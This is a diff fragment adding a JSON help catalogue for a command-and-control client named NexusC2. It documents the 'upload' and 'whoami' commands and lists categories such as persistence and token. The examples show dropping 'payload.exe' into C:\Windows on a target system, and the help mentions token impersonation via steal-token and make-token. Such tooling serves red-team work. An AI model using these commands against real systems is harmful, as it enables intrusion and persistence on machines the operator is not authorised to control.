+      ],
+      "platforms": {
+        "windows": true,
+        "linux": false,
+        "macos": false
+      }
+    },
+    {
+      "id": "upload",
+      "name": "upload",
+      "description": "Upload a file to the target system",
+      "syntax": "upload                     # Opens file dialog\nupload <local_path>        # Upload to CWD with original filename\nupload <local_path> <new_name>        # Upload to CWD with new filename\nupload <local_path> <remote_path>     # Upload to specific remote path",
+      "examples": [
+        "upload                             # Opens file selection dialog",
+        "upload /tmp/payload.exe            # Uploads as payload.exe in current directory",
+        "upload /tmp/payload.exe new.exe    # Uploads as new.exe in current directory",
+        "upload /tmp/payload.exe C:\\Windows\\payload.exe   # Uploads to full remote path",
+        "upload ./script.sh /tmp/script.sh  # Uploads to full remote path"
+      ],
+      "help": "Transfers a file to the target system:\n- No arguments: Opens file selection dialog\n- One argument: Uploads to current working directory with original filename\n- Two arguments:\n  * If second starts with / or \\: Uses as full remote path\n  * Otherwise: Uses as new filename in current directory\n- Local path must exist\n- Remote path must be writable\n- Progress shown during transfer\n",
+      "category": "file",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    },
+    {
+      "id": "whoami",
+      "name": "whoami",
+      "description": "Display current user information",
+      "syntax": "whoami                    # Show current username\nwhoami -v                 # Show detailed user and system information\nwhoami -g                 # Show group memberships",
+      "examples": [
+        "whoami",
+        "whoami -v",
+        "whoami -g"
+      ],
+      "help": "Displays information about the current user and system context.\n\nMODES:\n  Basic:    Shows just the username\n  Verbose:  Shows comprehensive user, system, and environment information\n\nFLAGS:\n  -v    Display detailed information including:\n        - User ID and Group ID\n        - Home directory\n        - Shell\n\n  -g    Display group memberships (group IDs)\n\nBASIC OUTPUT:\nReturns the current username in the format:\n  - Unix/Linux/macOS: username\n  - Windows: DOMAIN\\username or COMPUTER\\username\n\nVERBOSE OUTPUT (-v):\n  - UID: User ID\n  - GID: Group ID\n  - Home: Home directory path\n  - Shell: Default shell (or \"unknown\" if not available)\n\nGROUPS OUTPUT (-g):\n  - Lists all group IDs the user belongs to\n\nWINDOWS IMPERSONATION:\nWhen using an impersonated token (steal-token, make-token):\n  - Shows the impersonated user's identity\n  - With -v, indicates \"(impersonated)\" status\n\nEXAMPLES:\n\nQuick identity check:\n  whoami                    # Just show who I am\n\nGet user details:\n  whoami -v                 # Show UID, GID, home, shell\n\nCheck group memberships:\n  whoami -g                 # List all group IDs\n\nDomain information (Windows):\n  whoami                    # Shows DOMAIN\\username format\n",
+      "category": "info",
+      "os": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "platforms": {
+        "windows": true,
+        "linux": true,
+        "macos": true
+      }
+    }
+  ],
+  "categories": [
+    "execution",
+    "file",
+    "info",
+    "network",
+    "persistence",
+    "process",
+    "token",
+    "utility"
+  ],
+  "total": 46,
+  "metadata": {
+    "generated_from": "/home/sean/NexusC2/client/src/gui/widgets/commands.toml",
+    "category_counts": {
+      "token": 3,
+      "network": 4,
+      "execution": 9,
+      "file": 7,
+      "info": 2,
+      "utility": 17,
+      "persistence": 2,
+      "process": 2
+    }
+  }
+}
